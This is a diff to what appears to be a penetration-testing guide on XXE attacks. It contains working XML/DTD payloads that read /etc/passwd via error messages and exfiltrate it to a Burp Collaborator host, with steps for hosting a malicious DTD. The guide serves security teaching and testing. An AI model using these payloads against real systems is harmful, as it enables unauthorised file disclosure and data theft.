@@ -245,17 +245,17 @@ This leaks the contents of `/etc/passwd` through the error message.
 
 Creating a working payload for local DTD-based XXE exploitation requires careful attention to XML and DTD parsing rules. Below are the key requirements:
 
-1. Valid DTD Structure
+1. **Valid DTD Structure**
 
 - The injected payload must maintain a syntactically valid DTD.
 - All markup declarations (`<!ELEMENT>`, `<!ENTITY>`) must appear in a proper order.
 - If the included DTD (`%local_dtd;`) contains markup declarations, use a **dummy element** (e.g., `<!ELEMENT aa (bb'>`) to absorb conflicts and prevent parser errors.
 
-2. Correct Entity Nesting and Escaping
+2. **Correct Entity Nesting and Escaping**
 
 - Nested entity declarations inside another entity must be properly escaped:
-  * Use `&#x25;` for `%`, `&#x26;` for `&` and `&#x27;for  quotes.
-  * Example:
+  * Use `&#x25;` for `%`, `&#x26;` for `&` and `&#x27;` for  quotes.
+  * **Example**:
 
     ```xml
     <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///path/%file;'>">
@@ -263,14 +263,14 @@ Creating a working payload for local DTD-based XXE exploitation requires careful
 
 - Failure to escape these characters often results in **markup declaration errors**.
 
-3. Order of Expansion
+3. **Order of Expansion**
 
 - Define and expand entities in the correct sequence:
 - Override entities first.
 - Expand `%eval;` and `%error;` before including `%local_dtd;`.
 - Incorrect ordering can cause the parser to reject the payload.
 
-4. Include a Structural Padding
+4. **Include a Structural Padding**
 
 - When including external DTDs, add a placeholder declaration like:
 
@@ -280,7 +280,7 @@ Creating a working payload for local DTD-based XXE exploitation requires careful
 
 - This prevents syntax conflicts when the external DTD introduces new declarations.
 
-5. Use Parameter Entities for Injection
+5. **Use Parameter Entities for Injection**
 
 - Always use **parameter entities** (`%`) for overriding and chaining.
 - Example:
@@ -289,7 +289,7 @@ Creating a working payload for local DTD-based XXE exploitation requires careful
   <!ENTITY % file SYSTEM "file:///etc/passwd">
 ```
 
-6. Error-Based Exfiltration Logic
+6. **Error-Based Exfiltration Logic**
 
 - Ensure the payload triggers an error that includes the file content:
 - Reference a non-existent file concatenated with the target file content.
@@ -299,7 +299,7 @@ Creating a working payload for local DTD-based XXE exploitation requires careful
     <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
 ```
 
-7. Compatibility with Target DTD
+7. **Compatibility with Target DTD**
 
 - The chosen local DTD must allow parameter entity overrides.
 - Common candidates: `fonts.dtd`, `docbook.dtd`, `jspxml.dtd`
@@ -332,11 +332,11 @@ The core idea is simple:
 
 ### Exploitation Basics
 
-#### Step 1: Create a Malicious DTD
+- **Step 1: Create a Malicious DTD**
 
 On the attacker machine, create a DTD file containing the malicious actions. In this example, the content is designed to read `/etc/passwd`:
 
-```DTD
+```XML
 <!ENTITY % file SYSTEM "file:///etc/passwd">
 <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://<your-collaborator-id>.oastify.com/?x=%file;'>">
 %eval;
@@ -352,7 +352,7 @@ On the attacker machine, create a DTD file containing the malicious actions. In 
 
 **Why escape characters?** XML parsers enforce strict syntax rules. When nesting declarations, `%` must be escaped as `&#x25;` to avoid breaking the DTD structure.
 
-#### Step 2: Host the Malicious DTD
+- **Step 2: Host the Malicious DTD**
 
 Once the malicious DTD is created, host it on a server reachable by the target application. A simple Python HTTP server works:
 
@@ -362,7 +362,7 @@ python3 -m http.server 80
 
 Ensure the server is publicly accessible or reachable from the target environment. If DNS resolution might fail, use an IP address instead of a domain name.
 
-#### Step 3: XML Payload to Send to the Affected Application
+- **Step 3: XML Payload to Send to the Affected Application**
 
 Send an XML payload that loads the external DTD:
 
@@ -381,13 +381,13 @@ Send an XML payload that loads the external DTD:
 
 **Tip:** Use an IP address if DNS resolution is unreliable. Ensure the protocol (HTTP/HTTPS) matches what the target can access.
 
-#### Step 4: Monitor OOB Interaction
+- **Step 4: Monitor OOB Interaction**
 
 Use Burp Collaborator or a custom HTTP listener to capture the incoming request. Burp Collaborator provides a unique domain that logs all interactions, making it easy to confirm exploitation.
 
 Example with Burp Collaborator:
 
-```DTD
+```XML
 <!ENTITY % file SYSTEM "file:///etc/passwd">
 <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://<your-collaborator-id>.oastify.com/?x=%file;'>">
 %eval;
@@ -406,24 +406,19 @@ When the parser processes this, you should see an HTTP request to your Collabora
 
 ## Requirements for Crafting Robust Payloads
 
-#### 1. External Entity Resolution Enabled
-
+1. **External Entity Resolution Enabled:**
 The XML parser must allow fetching external resources via `SYSTEM` identifiers. If disabled, the attack will fail.
 
-#### 2. Ability to Inject DOCTYPE
-
+2. **Ability to Inject DOCTYPE:**
 The application must accept XML input with `<!DOCTYPE>` declarations. If the parser rejects DOCTYPE, XXE is not possible.
 
-#### 3. Attacker-Controlled Server
-
+3. **Attacker-Controlled Server:**
 You need a server or service to host the malicious DTD and capture requests.
 
-#### 4. Proper Parameter Entity Usage
-
+4. **Proper Parameter Entity Usage:**
 Use `%` for parameter entities and escape `%` as `&#x25;` when nesting declarations.
 
-#### 5. Network Access
-
+5. **Network Access:**
 The target server must have outbound network access to reach your controlled domain. If egress filtering blocks HTTP, consider DNS exfiltration.
 
 ### Troubleshooting Tips
